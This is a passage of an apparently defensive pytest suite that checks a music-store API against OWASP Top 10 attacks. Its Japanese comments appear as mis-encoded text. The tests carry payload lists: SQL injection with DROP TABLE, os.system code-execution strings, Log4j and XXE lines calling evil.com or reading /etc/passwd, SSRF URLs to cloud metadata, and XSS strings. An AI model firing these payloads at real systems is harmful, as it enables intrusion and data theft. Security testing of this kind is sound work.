"""
„Çª„Ç≠„É•„É™„ÉÜ„Ç£ËÑÜÂº±ÊÄßÂåÖÊã¨„ÉÜ„Çπ„Éà„Çπ„Ç§„Éº„Éà

OWASP Top 10„Åä„Çà„Å≥‰∏ÄËà¨ÁöÑ„Å™„Çª„Ç≠„É•„É™„ÉÜ„Ç£ËÑÜÂº±ÊÄß„ÇíÁ∂≤ÁæÖÁöÑ„Å´„ÉÜ„Çπ„Éà„Åó„Åæ„Åô„ÄÇ
"""

import pytest
import json
import base64
import hashlib
import hmac
import time
import re
from urllib.parse import quote, unquote
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session
from unittest.mock import patch, MagicMock

from app.main import app
from app.db.session import SessionLocal
from seed_data import create_seed_data
from tests.conftest import TestingSessionLocal, engine


class TestSecurityVulnerabilities:
    """„Çª„Ç≠„É•„É™„ÉÜ„Ç£ËÑÜÂº±ÊÄß„ÉÜ„Çπ„Éà„ÇØ„É©„Çπ"""
    
    @classmethod
    def setup_class(cls):
        """„Çª„Ç≠„É•„É™„ÉÜ„Ç£„ÉÜ„Çπ„Éà„Çª„ÉÉ„Éà„Ç¢„ÉÉ„Éó"""
        print("üîí „Çª„Ç≠„É•„É™„ÉÜ„Ç£ËÑÜÂº±ÊÄß„ÉÜ„Çπ„ÉàÈñãÂßã...")
        # „ÉÜ„Çπ„ÉàÁî®„Éá„Éº„Çø„Éô„Éº„Çπ„Åß„Çª„ÉÉ„Éà„Ç¢„ÉÉ„Éó
        from app.models.base import Base
        from app.models.user import User
        from app.schemas.user import UserRole
        import uuid
        
        Base.metadata.create_all(bind=engine)
        cls.client = TestClient(app)
        cls.session = TestingSessionLocal()
        
        # „ÉÜ„Çπ„ÉàÁî®„É¶„Éº„Ç∂„Éº„Çí‰ΩúÊàê
        cls._create_test_users()
        print("‚úÖ „Çª„Ç≠„É•„É™„ÉÜ„Ç£„ÉÜ„Çπ„ÉàÁí∞Â¢ÉÊ∫ñÂÇôÂÆå‰∫Ü")
    
    @classmethod
    def _create_test_users(cls):
        """„ÉÜ„Çπ„ÉàÁî®„É¶„Éº„Ç∂„Éº„Çí‰ΩúÊàê"""
        from app.models.user import User
        from app.schemas.user import UserRole
        import uuid
        
        try:
            # „ÉÜ„Çπ„ÉàÁî®„É™„Çπ„Éä„Éº
            listener = User(
                id=str(uuid.uuid4()),
                email="security_test_listener@example.com",
                firebase_uid="firebaseuid_listener",
                display_name="Security Test Listener",
                user_role=UserRole.LISTENER,
                is_verified=True
            )
            cls.session.add(listener)
            
            # „ÉÜ„Çπ„ÉàÁî®„Ç¢„Éº„ÉÜ„Ç£„Çπ„Éà
            artist = User(
                id=str(uuid.uuid4()),
                email="security_test_artist@example.com",
                firebase_uid="firebaseuid_artist",
                display_name="Security Test Artist",
                user_role=UserRole.ARTIST,
                is_verified=True
            )
            cls.session.add(artist)
            cls.session.commit()
            
        except Exception as e:
            print(f"„Çª„Ç≠„É•„É™„ÉÜ„Ç£„ÉÜ„Çπ„Éà„É¶„Éº„Ç∂„Éº‰ΩúÊàê„Ç®„É©„Éº: {e}")
            cls.session.rollback()
    
    @classmethod
    def teardown_class(cls):
        """„Çª„Ç≠„É•„É™„ÉÜ„Ç£„ÉÜ„Çπ„Éà„ÇØ„É™„Éº„É≥„Ç¢„ÉÉ„Éó"""
        cls.session.close()
    
    # ==================== OWASP A01: Broken Access Control ====================
    
    def test_vertical_privilege_escalation(self):
        """ÂûÇÁõ¥Ê®©ÈôêÊòáÊ†º„ÉÜ„Çπ„Éà"""
        # „É™„Çπ„Éä„Éº„Åå„Ç¢„Éº„ÉÜ„Ç£„Çπ„ÉàÊ©üËÉΩ„Å´„Ç¢„ÇØ„Çª„Çπ
        listener_headers = {"Authorization": "Bearer mock_token_listener"}
        
        # „Ç¢„Éº„ÉÜ„Ç£„Çπ„ÉàÂ∞ÇÁî®„Ç®„É≥„Éâ„Éù„Ç§„É≥„Éà„Å∏„ÅÆ„Ç¢„ÇØ„Çª„ÇπË©¶Ë°å
        artist_endpoints = [
            ("/api/v1/tracks/", "POST", {"title": "Unauthorized", "duration": 180, "price": 300}),
            ("/api/v1/tracks/upload/audio", "POST", {}),
            ("/api/v1/tracks/upload/cover", "POST", {}),
            ("/api/v1/artists/any-id/revenue", "GET", {}),
            ("/api/v1/artists/any-id/statistics", "GET", {}),
        ]
        
        for endpoint, method, data in artist_endpoints:
            if method == "POST":
                response = self.client.post(endpoint, headers=listener_headers, json=data)
            else:
                response = self.client.get(endpoint, headers=listener_headers)
            
            assert response.status_code in [401, 403, 404], f"Failed for {endpoint}"
    
    def test_horizontal_privilege_escalation(self):
        """Ê∞¥Âπ≥Ê®©ÈôêÊòáÊ†º„ÉÜ„Çπ„Éà"""
        # „É¶„Éº„Ç∂„ÉºA„Åå‰ªñ„ÅÆ„É¶„Éº„Ç∂„ÉºB„ÅÆ„É™„ÇΩ„Éº„Çπ„Å´„Ç¢„ÇØ„Çª„Çπ
        user_a_headers = {"Authorization": "Bearer mock_token_user_a"}
        user_b_id = "different_user_id"
        
        # ‰ªñ„É¶„Éº„Ç∂„Éº„ÅÆÂÄã‰∫∫ÊÉÖÂ†±„Ç¢„ÇØ„Çª„ÇπË©¶Ë°å
        protected_endpoints = [
            f"/api/v1/users/{user_b_id}",
            f"/api/v1/users/{user_b_id}/tracks",
            "/api/v1/purchases/",  # ‰ªñ„É¶„Éº„Ç∂„Éº„ÅÆË≥ºÂÖ•Â±•Ê≠¥
            f"/api/v1/artists/{user_b_id}/revenue",
        ]
        
        for endpoint in protected_endpoints:
            response = self.client.get(endpoint, headers=user_a_headers)
            assert response.status_code in [401, 403, 404]
    
    def test_insecure_direct_object_references(self):
        """‰∏çÂÆâÂÖ®„Å™Áõ¥Êé•„Ç™„Éñ„Ç∏„Çß„ÇØ„ÉàÂèÇÁÖß„ÉÜ„Çπ„Éà"""
        # ‰∫àÊ∏¨ÂèØËÉΩ„Å™ID„Åß„ÅÆ„Ç¢„ÇØ„Çª„ÇπË©¶Ë°å
        predictable_ids = [
            "1", "2", "3", "admin", "root", "test",
            "00000000-0000-0000-0000-000000000001",
            "user_1", "artist_1", "track_1"
        ]
        
        for obj_id in predictable_ids:
            endpoints = [
                f"/api/v1/users/{obj_id}",
                f"/api/v1/tracks/{obj_id}",
                f"/api/v1/artists/{obj_id}",
            ]
            
            for endpoint in endpoints:
                response = self.client.get(endpoint)
                # ÈÅ©Âàá„Å™Ë™çË®º„ÉÅ„Çß„ÉÉ„ÇØ„ÅåË°å„Çè„Çå„Å¶„ÅÑ„Çã„Åã„ÇíÁ¢∫Ë™ç
                assert response.status_code in [401, 403, 404, 422]
    
    # ==================== OWASP A02: Cryptographic Failures ====================
    
    def test_weak_session_management(self):
        """ËÑÜÂº±„Å™„Çª„ÉÉ„Ç∑„Éß„É≥ÁÆ°ÁêÜ„ÉÜ„Çπ„Éà"""
        # Âº±„ÅÑ„Çª„ÉÉ„Ç∑„Éß„É≥„Éà„Éº„ÇØ„É≥„ÅÆÊ§úÂá∫
        weak_tokens = [
            "12345678",
            "password",
            "admin123",
            "sessionid",
            "token",
            base64.b64encode(b"admin:admin").decode(),
        ]
        
        for token in weak_tokens:
            headers = {"Authorization": f"Bearer {token}"}
            response = self.client.get("/api/v1/auth/me", headers=headers)
            assert response.status_code in [401, 422]
    
    def test_data_exposure_in_transit(self):
        """„Éá„Éº„ÇøËª¢ÈÄÅÊôÇ„ÅÆÊ©üÂØÜÊÉÖÂ†±Èú≤Âá∫„ÉÜ„Çπ„Éà"""
        # „É¨„Çπ„Éù„É≥„Çπ„Å´Ê©üÂØÜÊÉÖÂ†±„ÅåÂê´„Åæ„Çå„Å¶„ÅÑ„Å™„ÅÑ„Åã„ÉÅ„Çß„ÉÉ„ÇØ
        response = self.client.get("/api/v1/tracks/")
        
        if response.status_code == 200:
            response_text = response.text.lower()
            
            # Ê©üÂØÜÊÉÖÂ†±„ÅåÈú≤Âá∫„Åó„Å¶„ÅÑ„Å™„ÅÑ„Åì„Å®„ÇíÁ¢∫Ë™ç
            sensitive_patterns = [
                "password", "secret", "private_key", "api_key",
                "database_url", "jwt_secret", "stripe_secret",
                "firebase_private_key", "s3_secret_key"
            ]
            
            for pattern in sensitive_patterns:
                assert pattern not in response_text
    
    def test_insecure_randomness(self):
        """‰∏çÂÆâÂÖ®„Å™‰π±Êï∞ÁîüÊàê„ÉÜ„Çπ„Éà"""
        # Ë§áÊï∞Âõû„ÅÆ„É™„ÇØ„Ç®„Çπ„Éà„ÅßID„ÅÆ‰∫àÊ∏¨ÂèØËÉΩÊÄß„Çí„ÉÅ„Çß„ÉÉ„ÇØ
        user_ids = []
        
        for i in range(10):
            user_data = {
                "email": f"random_test_{i}@example.com",
                "display_name": f"Random Test {i}",
                "firebase_uid": f"random_test_uid_{i}",
                "user_role": "LISTENER"
            }
            
            response = self.client.post("/api/v1/auth/register", json=user_data)
            if response.status_code == 200:
                user_ids.append(response.json()["id"])
        
        # ID„Åå‰∫àÊ∏¨ÂèØËÉΩ„Åß„Å™„ÅÑ„Åì„Å®„ÇíÁ¢∫Ë™ç
        if len(user_ids) >= 2:
            # ÈÄ£Á∂ö„Åó„ÅüÊï∞ÂÄ§„ÇÑ„Éë„Çø„Éº„É≥„Åß„Å™„ÅÑ„Åì„Å®„ÇíÁ¢∫Ë™ç
            for i in range(len(user_ids) - 1):
                current_id = user_ids[i]
                next_id = user_ids[i + 1]
                
                # ÂçòÁ¥î„Å™Â¢óÂàÜ„Åß„Å™„ÅÑ„Åì„Å®„ÇíÁ¢∫Ë™ç
                if current_id.isdigit() and next_id.isdigit():
                    assert int(next_id) - int(current_id) != 1
    
    # ==================== OWASP A03: Injection ====================
    
    def test_sql_injection_comprehensive(self):
        """ÂåÖÊã¨ÁöÑSQL„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥„ÉÜ„Çπ„Éà"""
        sql_payloads = [
            # Âü∫Êú¨ÁöÑ„Å™SQL„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE user; --",
            "' UNION SELECT * FROM user--",
            
            # „Éñ„É©„Ç§„É≥„ÉâSQL„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥
            "' AND (SELECT COUNT(*) FROM user) > 0--",
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            
            # ÊôÇÈñì„Éô„Éº„ÇπSQL„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥
            "' OR IF(1=1, SLEEP(5), 0)--",
            "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
            
            # „Ç®„É©„Éº„Éô„Éº„ÇπSQL„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # NoSQL„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥
            '{"$ne": null}',
            '{"$regex": ".*"}',
            '{"$where": "this.username == this.password"}',
        ]
        
        # Ê§úÁ¥¢„Éë„É©„É°„Éº„Çø„Åß„ÅÆSQL„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥
        for payload in sql_payloads:
            response = self.client.get(f"/api/v1/tracks/?search={quote(payload)}")
            
            # SQL„Ç®„É©„Éº„ÅåÈú≤Âá∫„Åó„Å¶„ÅÑ„Å™„ÅÑ„Åì„Å®„ÇíÁ¢∫Ë™ç
            assert response.status_code in [200, 400, 422]
            
            if response.status_code != 200:
                error_text = response.text.lower()
                sql_error_indicators = [
                    "sql", "mysql", "postgresql", "sqlite", "database",
                    "syntax error", "table", "column", "select", "insert",
                    "update", "delete", "drop", "union"
                ]
                
                for indicator in sql_error_indicators:
                    assert indicator not in error_text
    
    def test_nosql_injection(self):
        """NoSQL„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥„ÉÜ„Çπ„Éà"""
        nosql_payloads = [
            '{"$ne": ""}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "return true"}',
            '{"$expr": {"$gt": [{"$size": "$array"}, 0]}}',
        ]
        
        for payload in nosql_payloads:
            # JSONÂΩ¢Âºè„Åß„ÅÆÊîªÊíÉË©¶Ë°å
            response = self.client.get(f"/api/v1/tracks/?search={quote(payload)}")
            assert response.status_code in [200, 400, 422]
    
    def test_ldap_injection(self):
        """LDAP„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥„ÉÜ„Çπ„Éà"""
        ldap_payloads = [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "admin)(&(password=*))",
            "*))%00",
        ]
        
        for payload in ldap_payloads:
            response = self.client.get(f"/api/v1/tracks/?search={quote(payload)}")
            assert response.status_code in [200, 400, 422]
    
    def test_xpath_injection(self):
        """XPath„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥„ÉÜ„Çπ„Éà"""
        xpath_payloads = [
            "' or '1'='1",
            "'] | //user/*[contains(*,'Admin')] | //['",
            "' or count(parent::*[position()=1])=0 or '",
        ]
        
        for payload in xpath_payloads:
            response = self.client.get(f"/api/v1/tracks/?search={quote(payload)}")
            assert response.status_code in [200, 400, 422]
    
    # ==================== OWASP A04: Insecure Design ====================
    
    def test_business_logic_flaws(self):
        """„Éì„Ç∏„Éç„Çπ„É≠„Ç∏„ÉÉ„ÇØÊ¨†Èô•„ÉÜ„Çπ„Éà"""
        # Ë≤†„ÅÆ‰æ°Ê†º„Åß„ÅÆÊ•ΩÊõ≤‰ΩúÊàêË©¶Ë°å
        headers = {"Authorization": "Bearer mock_token_artist"}
        
        invalid_track_data = [
            {"title": "Free Track", "duration": 180, "price": -100},  # Ë≤†„ÅÆ‰æ°Ê†º
            {"title": "Zero Track", "duration": 180, "price": 0},     # „Çº„É≠‰æ°Ê†º
            {"title": "Long Track", "duration": -1, "price": 300},    # Ë≤†„ÅÆÂÜçÁîüÊôÇÈñì
            {"title": "", "duration": 180, "price": 300},             # Á©∫„ÅÆ„Çø„Ç§„Éà„É´
            {"title": "A" * 10000, "duration": 180, "price": 300},   # Ê•µÁ´Ø„Å´Èï∑„ÅÑ„Çø„Ç§„Éà„É´
        ]
        
        for track_data in invalid_track_data:
            response = self.client.post("/api/v1/tracks/", 
                                      headers=headers, json=track_data)
            assert response.status_code in [400, 422]
    
    def test_workflow_circumvention(self):
        """„ÉØ„Éº„ÇØ„Éï„É≠„ÉºÂõûÈÅøÊîªÊíÉ„ÉÜ„Çπ„Éà"""
        # Ë≥ºÂÖ•Ââç„Å´„ÉÄ„Ç¶„É≥„É≠„Éº„Éâ„ÇíË©¶Ë°å
        headers = {"Authorization": "Bearer mock_token_listener"}
        
        tracks_response = self.client.get("/api/v1/tracks/?limit=1")
        if tracks_response.status_code == 200:
            tracks = tracks_response.json()
            if tracks:
                track_id = tracks[0]["id"]
                
                # Ë≥ºÂÖ•„Åõ„Åö„Å´„ÉÄ„Ç¶„É≥„É≠„Éº„Éâ„ÇíË©¶Ë°å
                download_response = self.client.get(
                    f"/api/v1/purchases/track/{track_id}/download",
                    headers=headers
                )
                assert download_response.status_code in [403, 404]
    
    # ==================== OWASP A05: Security Misconfiguration ====================
    
    def test_information_disclosure(self):
        """ÊÉÖÂ†±ÊºèÊ¥©„ÉÜ„Çπ„Éà"""
        # „Ç®„É©„Éº„Éö„Éº„Ç∏„Åã„Çâ„ÅÆÊÉÖÂ†±ÊºèÊ¥©„ÉÅ„Çß„ÉÉ„ÇØ
        response = self.client.get("/nonexistent-endpoint")
        assert response.status_code == 404
        
        error_text = response.text.lower()
        sensitive_info = [
            "stack trace", "traceback", "exception",
            "/users/", "/home/", "c:\\", "database",
            "password", "secret", "internal server error details"
        ]
        
        for info in sensitive_info:
            assert info not in error_text
    
    def test_debug_information_exposure(self):
        """„Éá„Éê„ÉÉ„Ç∞ÊÉÖÂ†±Èú≤Âá∫„ÉÜ„Çπ„Éà"""
        # „Éá„Éê„ÉÉ„Ç∞„É¢„Éº„Éâ„ÅÆÊÉÖÂ†±„ÅåÈú≤Âá∫„Åó„Å¶„ÅÑ„Å™„ÅÑ„Åã„ÉÅ„Çß„ÉÉ„ÇØ
        endpoints = ["/", "/docs", "/openapi.json"]
        
        for endpoint in endpoints:
            response = self.client.get(endpoint)
            if response.status_code == 200:
                content = response.text.lower()
                
                debug_indicators = [
                    "debug=true", "development", "localhost",
                    "stack trace", "internal error", "django_debug"
                ]
                
                for indicator in debug_indicators:
                    assert indicator not in content
    
    def test_default_credentials(self):
        """„Éá„Éï„Ç©„É´„ÉàË™çË®ºÊÉÖÂ†±„ÉÜ„Çπ„Éà"""
        default_creds = [
            ("admin", "admin"),
            ("admin", "password"),
            ("root", "root"),
            ("admin", "123456"),
            ("test", "test"),
        ]
        
        for username, password in default_creds:
            auth_data = {
                "email": f"{username}@example.com",
                "password": password
            }
            
            response = self.client.post("/api/v1/auth/login", json=auth_data)
            # „Éá„Éï„Ç©„É´„ÉàË™çË®ºÊÉÖÂ†±„Åß„ÅÆ„É≠„Ç∞„Ç§„É≥„ÅØÂ§±Êïó„Åô„Çã„Åπ„Åç
            assert response.status_code in [400, 401, 422]
    
    # ==================== OWASP A06: Vulnerable Components ====================
    
    def test_dependency_vulnerabilities(self):
        """‰æùÂ≠òÈñ¢‰øÇËÑÜÂº±ÊÄß„ÉÜ„Çπ„Éà"""
        # Êó¢Áü•„ÅÆËÑÜÂº±„Å™„Ç®„É≥„Éâ„Éù„Ç§„É≥„Éà„Éë„Çø„Éº„É≥„Çí„ÉÜ„Çπ„Éà
        vulnerable_patterns = [
            "/console",           # Spring Boot Actuator
            "/actuator",         # Spring Boot Actuator
            "/management",       # Management endpoints
            "/.env",             # Environment files
            "/config.php",       # PHP config files
            "/web.config",       # ASP.NET config
            "/robots.txt",       # Robot exclusion
            "/sitemap.xml",      # Sitemap
        ]
        
        for pattern in vulnerable_patterns:
            response = self.client.get(pattern)
            # „Åì„Çå„Çâ„ÅÆ„Ç®„É≥„Éâ„Éù„Ç§„É≥„Éà„ÅØÂ≠òÂú®„Åó„Å™„ÅÑ„Åã„ÄÅÈÅ©Âàá„Å´‰øùË≠∑„Åï„Çå„Å¶„ÅÑ„Çã„Åπ„Åç
            assert response.status_code in [404, 403, 401]
    
    # ==================== OWASP A07: Identity and Authentication Failures ====================
    
    def test_weak_password_policy(self):
        """ËÑÜÂº±„Å™„Éë„Çπ„ÉØ„Éº„Éâ„Éù„É™„Ç∑„Éº„ÉÜ„Çπ„Éà"""
        weak_passwords = [
            "123",
            "password",
            "admin",
            "12345678",
            "qwerty",
            "abc123",
            "",  # Á©∫„ÅÆ„Éë„Çπ„ÉØ„Éº„Éâ
        ]
        
        for weak_pwd in weak_passwords:
            user_data = {
                "email": f"weak_{hash(weak_pwd)}@example.com",
                "display_name": "Weak Password User",
                "firebase_uid": f"weak_uid_{hash(weak_pwd)}",
                "user_role": "LISTENER",
                "password": weak_pwd
            }
            
            response = self.client.post("/api/v1/auth/register", json=user_data)
            # Âº±„ÅÑ„Éë„Çπ„ÉØ„Éº„Éâ„ÅØÊãíÂê¶„Åï„Çå„Çã„Åπ„ÅçÔºàÂÆüË£Ö„Å´„Çà„ÇäÁï∞„Å™„ÇãÔºâ
            if response.status_code == 400:
                error_response = response.json()
                assert "password" in error_response["detail"].lower()
    
    def test_brute_force_protection(self):
        """„Éñ„É´„Éº„Éà„Éï„Ç©„Éº„ÇπÊîªÊíÉ‰øùË≠∑„ÉÜ„Çπ„Éà"""
        # Âêå„Åò„É¶„Éº„Ç∂„Éº„ÅßË§áÊï∞Âõû„É≠„Ç∞„Ç§„É≥Â§±Êïó„ÇíË©¶Ë°å
        failed_attempts = []
        
        for i in range(10):
            login_data = {
                "email": "brute_force_test@example.com",
                "password": f"wrong_password_{i}"
            }
            
            response = self.client.post("/api/v1/auth/login", json=login_data)
            failed_attempts.append(response.status_code)
            
            # „Çè„Åö„Åã„Å™ÈÅÖÂª∂„ÇíÂÖ•„Çå„Å¶ÁèæÂÆüÁöÑ„Å™ÊîªÊíÉ„Çí„Ç∑„Éü„É•„É¨„Éº„Éà
            time.sleep(0.1)
        
        # ÈÄ£Á∂ö„Åó„ÅüÂ§±ÊïóÂæå„Å´„Ç¢„Ç´„Ç¶„É≥„Éà„É≠„ÉÉ„ÇØ„Åæ„Åü„ÅØ„É¨„Éº„ÉàÂà∂Èôê„ÅåÁô∫Áîü„Åô„Çã„Åπ„Åç
        if len(failed_attempts) > 5:
            later_attempts = failed_attempts[5:]
            # ÂæåÂçä„ÅÆË©¶Ë°å„Åß429 (Too Many Requests) „ÅåËøî„Åï„Çå„Çã„Åì„Å®„ÇíÊúüÂæÖ
            assert any(status == 429 for status in later_attempts)
    
    def test_session_fixation(self):
        """„Çª„ÉÉ„Ç∑„Éß„É≥Âõ∫ÂÆöÊîªÊíÉ„ÉÜ„Çπ„Éà"""
        # ‰∫ãÂâçÂÆöÁæ©„Åï„Çå„Åü„Çª„ÉÉ„Ç∑„Éß„É≥ID„Åß„ÅÆË™çË®ºË©¶Ë°å
        fixed_session = "FIXED_SESSION_ID_123"
        
        headers = {
            "Authorization": f"Bearer {fixed_session}",
            "Cookie": f"session_id={fixed_session}"
        }
        
        response = self.client.get("/api/v1/auth/me", headers=headers)
        assert response.status_code in [401, 422]
    
    # ==================== OWASP A08: Software and Data Integrity Failures ====================
    
    def test_deserialization_attacks(self):
        """„Éá„Ç∑„É™„Ç¢„É©„Ç§„Çº„Éº„Ç∑„Éß„É≥ÊîªÊíÉ„ÉÜ„Çπ„Éà"""
        # ÊÇ™ÊÑè„ÅÆ„ÅÇ„Çã„Ç∑„É™„Ç¢„É©„Ç§„Ç∫„Éá„Éº„Çø„Åß„ÅÆÊîªÊíÉË©¶Ë°å
        malicious_payloads = [
            # Python pickleÊîªÊíÉ
            "gASVOgAAAAAAAAB9lIwEbmFtZZSMBGV2aWyUc4aULg==",
            
            # JSONÊîªÊíÉ
            '{"__type": "System.Object", "value": "malicious"}',
            
            # XMLÊîªÊíÉ
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY test SYSTEM "file:///etc/passwd">]><test>&test;</test>',
        ]
        
        for payload in malicious_payloads:
            # Base64„Ç®„É≥„Ç≥„Éº„Éâ„Åï„Çå„Åü„Éö„Ç§„É≠„Éº„Éâ„Åß„ÅÆÊîªÊíÉ
            response = self.client.post("/api/v1/auth/register", 
                                      data=payload,
                                      headers={"Content-Type": "application/json"})
            assert response.status_code in [400, 422]
    
    def test_unsigned_code_execution(self):
        """ÁΩ≤Âêç„Åï„Çå„Å¶„ÅÑ„Å™„ÅÑ„Ç≥„Éº„ÉâÂÆüË°å„ÉÜ„Çπ„Éà"""
        # „Ç≥„Éº„ÉâÂÆüË°å„ÇíË©¶„Åø„ÇãÊÇ™ÊÑè„ÅÆ„ÅÇ„Çã„Éö„Ç§„É≠„Éº„Éâ
        code_execution_payloads = [
            "__import__('os').system('whoami')",
            "eval('__import__(\"os\").system(\"whoami\")')",
            "exec('import os; os.system(\"whoami\")')",
            "${jndi:ldap://evil.com/exploit}",  # Log4j
            "{{7*7}}",  # Template injection
            "<%=7*7%>",  # JSP injection
        ]
        
        for payload in code_execution_payloads:
            track_data = {
                "title": payload,
                "description": "Code execution test",
                "genre": "„ÉÜ„Çπ„Éà",
                "duration": 180,
                "price": 300
            }
            
            headers = {"Authorization": "Bearer mock_token_artist"}
            response = self.client.post("/api/v1/tracks/", 
                                      headers=headers, json=track_data)
            
            # „Ç≥„Éº„ÉâÂÆüË°å„ÅØÈò≤„Åå„Çå„Çã„Åπ„Åç
            if response.status_code == 200:
                created_track = response.json()
                # „Éö„Ç§„É≠„Éº„Éâ„Åå„Åù„ÅÆ„Åæ„ÅæÂÆüË°å„Åï„Çå„Å¶„ÅÑ„Å™„ÅÑ„Åì„Å®„ÇíÁ¢∫Ë™ç
                assert created_track["title"] == payload  # „Çµ„Éã„Çø„Ç§„Ç∫„Åï„Çå„Å¶‰øùÂ≠ò
                assert "49" not in str(created_track)  # 7*7=49„ÅåÂÆüË°å„Åï„Çå„Å¶„ÅÑ„Å™„ÅÑ
    
    # ==================== OWASP A09: Security Logging and Monitoring Failures ====================
    
    def test_audit_trail_tampering(self):
        """Áõ£ÊüªË®ºË∑°Êîπ„Åñ„Çì„ÉÜ„Çπ„Éà"""
        # „É≠„Ç∞ÂâäÈô§„ÉªÊîπ„Åñ„Çì„ÅÆË©¶Ë°å
        log_tampering_payloads = [
            "\x00",  # Null byte
            "\r\n[FAKE LOG] Admin login successful",
            "\x08\x08\x08\x08",  # Backspace characters
            "\x1b[2J\x1b[H",  # ANSI escape sequences
        ]
        
        for payload in log_tampering_payloads:
            user_data = {
                "email": f"log_test@example.com",
                "display_name": payload,
                "firebase_uid": "log_test_uid",
                "user_role": "LISTENER"
            }
            
            response = self.client.post("/api/v1/auth/register", json=user_data)
            # „É≠„Ç∞Êîπ„Åñ„Çì„ÅØÈò≤„Åå„Çå„Çã„Åπ„Åç
            assert response.status_code in [200, 400, 422]
    
    def test_log_injection(self):
        """„É≠„Ç∞„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥ÊîªÊíÉ„ÉÜ„Çπ„Éà"""
        # „É≠„Ç∞„Å´ÊÇ™ÊÑè„ÅÆ„ÅÇ„Çã„Éá„Éº„Çø„ÇíÊ≥®ÂÖ•„Åô„ÇãË©¶Ë°å
        log_injection_payloads = [
            "admin\nINFO: Fake admin login successful",
            "test\r\nERROR: System compromised",
            "user\x00\nSUCCESS: Root access granted",
        ]
        
        for payload in log_injection_payloads:
            response = self.client.get(f"/api/v1/tracks/?search={quote(payload)}")
            assert response.status_code in [200, 400, 422]
    
    # ==================== OWASP A10: Server-Side Request Forgery (SSRF) ====================
    
    def test_ssrf_attacks(self):
        """SSRFÊîªÊíÉ„ÉÜ„Çπ„Éà"""
        ssrf_payloads = [
            "http://localhost:22",      # ÂÜÖÈÉ®„Çµ„Éº„Éì„Çπ„Çπ„Ç≠„É£„É≥
            "http://127.0.0.1:3306",   # „Éá„Éº„Çø„Éô„Éº„Çπ„Ç¢„ÇØ„Çª„Çπ
            "http://169.254.169.254/", # AWS „É°„Çø„Éá„Éº„Çø„Çµ„Éº„Éì„Çπ
            "file:///etc/passwd",      # „É≠„Éº„Ç´„É´„Éï„Ç°„Ç§„É´Ë™≠„ÅøÂèñ„Çä
            "ftp://internal.server/",  # ÂÜÖÈÉ®FTP„Çµ„Éº„Éê„Éº
            "gopher://localhost:25/",  # Gopher „Éó„É≠„Éà„Ç≥„É´
            "dict://localhost:11211/", # Memcached
            "ldap://internal.ldap/",   # LDAP „Çµ„Éº„Éê„Éº
        ]
        
        # „Ç¢„Éê„Çø„ÉºÁîªÂÉèURL„Å™„Å©„ÅßSSRFÊîªÊíÉ„ÇíË©¶Ë°å
        for payload in ssrf_payloads:
            track_data = {
                "title": "SSRF Test Track",
                "description": "SSRF test",
                "genre": "„ÉÜ„Çπ„Éà",
                "cover_art_url": payload,  # SSRFÊîªÊíÉ„Éô„ÇØ„Çø„Éº
                "audio_file_url": "https://example.com/audio.mp3",
                "duration": 180,
                "price": 300
            }
            
            headers = {"Authorization": "Bearer mock_token_artist"}
            response = self.client.post("/api/v1/tracks/", 
                                      headers=headers, json=track_data)
            
            # SSRFÊîªÊíÉ„ÅØÈò≤„Åå„Çå„Çã„Åπ„Åç
            assert response.status_code in [400, 422]
    
    # ==================== ËøΩÂä†„ÅÆ„Çª„Ç≠„É•„É™„ÉÜ„Ç£„ÉÜ„Çπ„Éà ====================
    
    def test_xml_external_entity_injection(self):
        """XXE (XML External Entity) „Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥„ÉÜ„Çπ„Éà"""
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><test>&xxe;</test>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">%remote;]><test></test>',
        ]
        
        for payload in xxe_payloads:
            response = self.client.post("/api/v1/auth/register",
                                      data=payload,
                                      headers={"Content-Type": "application/xml"})
            # XXEÊîªÊíÉ„ÅØÈò≤„Åå„Çå„Çã„Åπ„Åç
            assert response.status_code in [400, 415, 422]  # Unsupported Media Type
    
    def test_cross_site_scripting_comprehensive(self):
        """ÂåÖÊã¨ÁöÑXSSÊîªÊíÉ„ÉÜ„Çπ„Éà"""
        xss_payloads = [
            # Âü∫Êú¨ÁöÑ„Å™XSS
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            
            # „Éï„Ç£„É´„Çø„ÉºÂõûÈÅøXSS
            "<ScRiPt>alert('xss')</ScRiPt>",
            "javascript:alert('xss')",
            "<iframe src='javascript:alert(\"xss\")'></iframe>",
            
            # „Ç§„Éô„É≥„Éà„Éè„É≥„Éâ„É©„ÉºXSS
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
            "<select onfocus=alert('xss') autofocus><option>test</option></select>",
            
            # Â±ûÊÄßÂÜÖXSS
            "\" onmouseover=\"alert('xss')\"",
            "' onclick='alert(\"xss\")'",
            
